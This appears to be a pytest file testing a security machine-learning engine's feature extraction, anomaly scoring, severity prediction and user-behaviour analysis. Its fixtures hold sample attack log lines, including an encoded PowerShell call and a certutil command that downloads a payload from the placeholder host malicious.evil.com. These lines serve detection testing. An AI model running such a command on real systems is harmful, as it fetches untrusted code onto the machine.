import pytest
from app.services.ml_engine import ml_engine, EnterpriseMLEngine

def test_ml_engine_initialization():
    assert ml_engine is not None
    assert ml_engine.is_trained is True
    metrics = ml_engine.get_metrics()
    assert metrics["status"] == "operational"
    assert metrics["is_trained"] is True
    assert "models" in metrics
    assert "anomaly_detector" in metrics["models"]
    assert "triage_classifier" in metrics["models"]

def test_ml_feature_extraction():
    sample_event = {
        "rule": {"level": 12},
        "full_log": "powershell.exe -enc aWVYKCAp",
        "user": "Administrator",
        "action": "logon_failed",
        "destination_port": 4444
    }
    features = ml_engine.extract_features(sample_event)
    assert features.shape == (1, len(EnterpriseMLEngine.FEATURE_NAMES))
    # Check rule level normalized
    assert features[0, 0] == 12.0
    # Check LOLBin detected for powershell
    assert features[0, 8] == 1.0
    # Check privileged account
    assert features[0, 6] == 1.0

def test_ml_predict_anomaly_normal_vs_suspicious():
    normal_event = {
        "rule": {"level": 2},
        "full_log": "Routine system health check completed.",
        "user": "system_user"
    }
    result_normal = ml_engine.predict_anomaly(normal_event)
    assert "anomaly_score" in result_normal
    assert "is_anomaly" in result_normal
    assert 0 <= result_normal["anomaly_score"] <= 100

    attack_event = {
        "rule": {"level": 15},
        "full_log": "cmd.exe /c certutil.exe -urlcache -split -f http://malicious.evil.com/payload.exe",
        "user": "SYSTEM",
        "action": "authentication_failed",
        "destination_port": 4444
    }
    result_attack = ml_engine.predict_anomaly(attack_event)
    assert result_attack["anomaly_score"] >= result_normal["anomaly_score"]

def test_ml_predict_severity():
    high_threat = {
        "rule": {"level": 14},
        "full_log": "Ransomware canary file modified in C:\\Users\\Admin\\Documents",
        "user": "Admin"
    }
    prediction = ml_engine.predict_severity(high_threat)
    assert "predicted_severity" in prediction
    assert "confidence" in prediction
    assert prediction["predicted_severity"] in ["LOW", "MEDIUM", "HIGH", "CRITICAL"]

def test_ueba_analysis():
    event = {
        "user": "analyst1",
        "destination_port": 22,
        "action": "ssh_login"
    }
    ueba = ml_engine.analyze_ueba(event)
    assert "ueba_risk_score" in ueba
    assert "entity_user" in ueba
    assert ueba["entity_user"] == "analyst1"
